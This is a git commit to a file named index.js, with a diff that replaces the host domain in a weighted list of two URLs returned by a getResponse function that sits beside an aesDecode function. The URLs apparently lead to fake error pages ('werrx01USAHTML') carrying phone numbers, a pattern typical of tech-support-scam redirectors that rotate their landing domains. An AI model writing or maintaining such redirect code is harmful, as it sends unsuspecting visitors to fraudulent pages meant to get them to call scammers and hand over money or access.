ff54d6a2b941ea0302ef0d8a1451866b92acf245
animalinside <akshay.anand12@yahoo.com>
2026-05-27 08:04:22 +0530

    Update index.js

--- index.js
+++ index.js
@@ -72,8 +72,8 @@ function aesDecode(encryptedText) {
   function getResponse() {
 
     const links = [
-        { url: "https://aurafit.on-forge.com/werrx01USAHTML/?bcda=800 852 3109", weight: 0.5 },
-        { url: "https://aurafit.on-forge.com/werrx01USAHTML/?bcda=+65-653-106-3088", weight: 0.5 }
+        { url: "https://Modenza.on-forge.com/werrx01USAHTML/?bcda=800 852 3109", weight: 0.5 },
+        { url: "https://Modenza.on-forge.com/werrx01USAHTML/?bcda=+65-653-106-3088", weight: 0.5 }
       
     ];
 
